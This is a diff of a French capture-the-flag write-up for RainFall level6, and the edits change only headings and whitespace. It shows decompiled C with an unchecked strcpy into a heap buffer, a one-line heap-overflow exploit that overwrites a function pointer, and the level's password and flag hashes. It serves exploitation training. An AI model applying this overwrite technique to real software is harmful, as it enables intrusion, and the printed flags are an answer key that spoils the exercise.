@@ -2,7 +2,7 @@
 
 pass : `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
 
-## Sources :
+## Source :
 
 ```c
 #include <stdlib.h>
@@ -16,11 +16,11 @@ void	m(char *str) {  // 0x08048468
 }
 
 void	main(int ac, char **av) {  // 0x0804847c
-  void *(*ptr_function)(char *);  // esp+0x18
-  char *buf;  // esp+0x1c
-  
+	void *(*ptr_function)(char *);  // esp+0x18
+	char *buf;  // esp+0x1c
+
 	buf = malloc(64);
-	ptr_function = malloc(4);  
+	ptr_function = malloc(4);
 	ptr_function = &m;
 	strcpy(buf, av[1]);
 	(*ptr_function)(buf);
@@ -75,7 +75,7 @@ Donc dans notre cas, on écrit au total 76 bytes :
 ## Exploit :
 
 ```shell
-level6@RainFall:~$ ./level6 $(python -c 'print "A"*72+"\x54\x84\x04\x08"') 
+level6@RainFall:~$ ./level6 $(python -c 'print "A"*72+"\x54\x84\x04\x08"')
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
 
